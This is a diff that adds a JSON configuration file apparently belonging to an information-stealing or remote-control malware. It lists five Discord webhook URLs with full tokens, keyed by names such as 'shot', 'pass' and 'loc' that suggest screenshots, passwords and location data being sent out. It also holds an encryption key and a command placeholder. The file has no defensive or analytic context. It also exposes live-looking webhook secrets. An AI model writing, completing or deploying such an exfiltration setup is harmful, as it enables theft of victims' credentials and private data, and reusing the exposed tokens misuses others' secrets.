@@ -1,0 +1,12 @@
+{
+  "hooks": {
+    "shot": "https://discord.com/api/webhooks/1573503778274148352/MqYZCkPpnxoW7TQqb8_CtQlHUyg4OHSHewGtXLxUUMTKV43TeDZr-steickFI8345KqO",
+    "pass": "https://discord.com/api/webhooks/1573503842685947904/tYSh-vDqh-ks7dBAuFtiC37dvjFMn-ehZtQr0GXQbD5AIcd8DHss0EewdE1w8HJNY4E5",
+    "exe":  "https://discord.com/api/webhooks/1573503888634417244/kl1Nuhq2K37pRf8-T6ehpnsldp2c76g98Hs1ti1cTk6wq5RWK0FY7hLi39Vbk7IgChlI",
+    "ctl":  "https://discord.com/api/webhooks/1573503923917033573/HuWW5tnCXDqh72gQQFBm5mRO6zAMASFidbmaEoOm0-ptyELRPNVTTEK8wnXM2CXA3EsY",
+    "loc":  "https://discord.com/api/webhooks/1573504462595821590/g3bDd3RbvhRjoU-4G6KKk9YPqYCszB1qu4nFPWnf-SBDU4fblf_IdhmjhWafLSEg1SdI"
+  },
+  "key": "43 47 86 d9 2d a1 63 8a 92 85 b8 a0 8c 26 ae 26 
+4d 39 77 fd d9 32 9d f2 73 d2 b6 c8 bf 1a 5c 7e ",
+  "cmd": "PLACEHOLDER"
+}
